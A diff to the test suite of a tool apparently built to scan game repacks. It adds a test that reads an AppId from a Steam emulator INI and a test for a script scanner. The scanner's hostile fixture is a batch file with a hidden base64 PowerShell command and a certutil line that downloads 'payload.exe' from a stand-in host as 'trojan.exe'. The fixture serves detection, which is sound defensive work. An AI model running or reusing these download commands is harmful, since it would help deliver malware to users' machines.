@@ -6,7 +6,7 @@ import shutil
 import tempfile
 import unittest
 
-from gamecleaner.analyzer import PEScanner, ThreatSeverity, calculate_entropy
+from gamecleaner.analyzer import PEScanner, ScriptScanner, ThreatSeverity, calculate_entropy
 from gamecleaner.cleaner import EmulatorReplacer, QuarantineManager
 from gamecleaner.containment import FirewallManager, SandboxGenerator
 from gamecleaner.pipeline import GameCleanerPipeline
@@ -111,6 +111,41 @@ class TestGameCleaner(unittest.TestCase):
         # Test backup
         backup_path = er.backup_dll(targets[0])
         self.assertTrue(backup_path.exists())
+
+    def test_ini_appid_discovery(self):
+        er = EmulatorReplacer(self.test_dir)
+        sub = self.test_dir / "bin"
+        sub.mkdir()
+        (sub / "steam_api64.dll").write_text("dummy")
+
+        # Create repack INI file with AppId
+        (self.test_dir / "steam_emu.ini").write_text("[Settings]\nAppId = 1245620\nLanguage = english\n")
+
+        targets = er.find_drm_targets()
+        self.assertEqual(len(targets), 1)
+        self.assertEqual(targets[0].app_id, "1245620")
+
+    def test_script_scanner(self):
+        scanner = ScriptScanner()
+
+        # Safe script
+        safe_bat = self.test_dir / "RunGame.bat"
+        safe_bat.write_text("@echo off\necho Launching Game...\nstart MyGame.exe\n")
+        res_safe = scanner.scan_file(safe_bat)
+        self.assertEqual(res_safe.overall_severity, ThreatSeverity.CLEAN.value)
+        self.assertEqual(res_safe.recommended_action, "KEEP")
+
+        # Hostile script with Base64 PowerShell dropper & Discord exfil
+        shady_bat = self.test_dir / "Launch_Repack.bat"
+        shady_bat.write_text(
+            "@echo off\n"
+            "powershell -WindowStyle Hidden -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAA==\n"
+            "certutil.exe -urlcache -split -f https://badsite.com/payload.exe %TEMP%\\trojan.exe\n"
+        )
+        res_shady = scanner.scan_file(shady_bat)
+        self.assertEqual(res_shady.overall_severity, ThreatSeverity.CRITICAL.value)
+        self.assertEqual(res_shady.recommended_action, "QUARANTINE")
+        self.assertGreaterEqual(len(res_shady.findings), 2)
 
 
 if __name__ == "__main__":
